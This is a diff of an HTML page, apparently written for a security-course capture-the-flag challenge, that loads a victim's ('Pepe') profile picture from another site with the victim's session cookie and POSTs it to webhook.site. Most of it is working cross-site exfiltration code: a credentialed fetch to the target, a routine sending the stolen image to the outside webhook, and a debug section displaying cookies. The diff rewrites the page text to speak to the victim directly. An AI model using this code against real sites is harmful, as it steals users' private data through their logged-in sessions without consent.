@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Load Profile Picture from p1 and Send to Webhook</title>
+    <title>Load and Send Profile Picture to Webhook</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -42,17 +42,12 @@
 </head>
 <body>
     <h1>Profile Picture from p1</h1>
-    <p>Attempting to load the profile picture from p1 using two methods: an img tag and a fetch request. If successful, the image will be sent to webhook.site via POST.</p>
+    <p>When you (Pepe) open this page, it will load your profile picture from p1 and send it to a webhook for capture.</p>
 
-    <!-- Method 1: Using <img> tag to load the image directly -->
-    <h2>Method 1: Using &lt;img&gt; tag</h2>
-    <p>This uses a simple img tag to load the image. The browser automatically sends the session cookie if available.</p>
-    <img src="https://chl-60d5b8fe-ad2b-4192-b170-f20940af90ab-imagen-importante.softwareseguro.com.ar/profile-pic" alt="User profile picture from p1" id="profile-pic-img">
-
-    <!-- Method 2: Using fetch to load the image -->
-    <h2>Method 2: Using fetch</h2>
-    <p>This uses JavaScript fetch to load the image as a Blob and display it. It explicitly includes credentials to send the session cookie.</p>
-    <div id="fetch-result"></div>
+    <!-- Display the image -->
+    <h2>Your Profile Picture</h2>
+    <p>The image below is loaded from p1 and sent to the webhook.</p>
+    <div id="image-display"></div>
 
     <!-- Debug: Show current cookies for p1 -->
     <h2>Debug: Current Cookies</h2>
@@ -103,34 +98,35 @@
 
         // Function to send image to webhook
         async function sendToWebhook(blob, filename = 'profile-pic.png') {
+            const imageDisplay = document.getElementById('image-display');
             try {
                 const formData = new FormData();
-                formData.append('file', blob, filename); // Adjunta la imagen como archivo
+                formData.append('file', blob, filename); // Attach image as a file
 
                 const response = await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     body: formData,
                     headers: {
-                        'X-From': 'p2-profile-loader' // Header opcional para identificar la solicitud
+                        'X-From': 'p2-profile-loader' // Optional header for identification
                     }
                 });
 
                 if (response.ok) {
-                    console.log('Imagen enviada exitosamente al webhook');
+                    imageDisplay.innerHTML += '<p class="success">Image sent successfully to webhook.site!</p>';
                     return true;
                 } else {
-                    console.error('Error al enviar al webhook:', response.status);
+                    imageDisplay.innerHTML += `<p class="error">Failed to send image to webhook.site (Status: ${response.status}).</p>`;
                     return false;
                 }
             } catch (error) {
-                console.error('Error al enviar al webhook:', error);
+                imageDisplay.innerHTML += `<p class="error">Error sending to webhook: ${error.message}.</p>`;
                 return false;
             }
         }
 
-        // Function to load the image using fetch
+        // Function to load and display the image
         async function loadProfilePicture() {
-            const fetchResult = document.getElementById('fetch-result');
+            const imageDisplay = document.getElementById('image-display');
             try {
                 const response = await fetch('https://chl-60d5b8fe-ad2b-4192-b170-f20940af90ab-imagen-importante.softwareseguro.com.ar/profile-pic', {
                     method: 'GET',
@@ -140,9 +136,9 @@
 
                 if (!response.ok) {
                     if (response.status === 302) {
-                        fetchResult.innerHTML = '<p class="error">Error: Redirected to login. The session cookie is invalid or missing. Please log in to p1 using the button below.</p>';
+                        imageDisplay.innerHTML = '<p class="error">Error: Redirected to login. The session cookie is invalid or missing. Please log in to p1 using the button below.</p>';
                     } else {
-                        fetchResult.innerHTML = `<p class="error">Error: Failed to load image (Status: ${response.status}).</p>`;
+                        imageDisplay.innerHTML = `<p class="error">Error: Failed to load image (Status: ${response.status}).</p>`;
                     }
                     return;
                 }
@@ -151,23 +147,17 @@
                 const blob = await response.blob();
                 const imgUrl = URL.createObjectURL(blob);
                 
-                // Create and append the image
+                // Display the image
                 const img = document.createElement('img');
                 img.src = imgUrl;
-                img.alt = 'User profile picture loaded via fetch from p1';
-                fetchResult.appendChild(img);
+                img.alt = 'User profile picture from p1';
+                imageDisplay.appendChild(img);
 
-                // Send the image to webhook.site
-                const sent = await sendToWebhook(blob, 'profile-pic-from-p1.png');
-                if (sent) {
-                    fetchResult.innerHTML += '<p class="success">Image loaded successfully via fetch and sent to webhook.site!</p>';
-                } else {
-                    fetchResult.innerHTML += '<p class="error">Image loaded but failed to send to webhook.site.</p>';
-                }
+                // Send the image to webhook
+                await sendToWebhook(blob, 'profile-pic-from-pepe.png');
 
-                fetchResult.innerHTML += '<p class="info">Image loaded successfully via fetch.</p>';
             } catch (error) {
-                fetchResult.innerHTML = `<p class="error">Error: ${error.message}. Check if the server is reachable, CORS is properly configured, or the session cookie is valid.</p>`;
+                imageDisplay.innerHTML = `<p class="error">Error: ${error.message}. Check if the server is reachable, CORS is properly configured, or the session cookie is valid.</p>`;
             }
         }
 
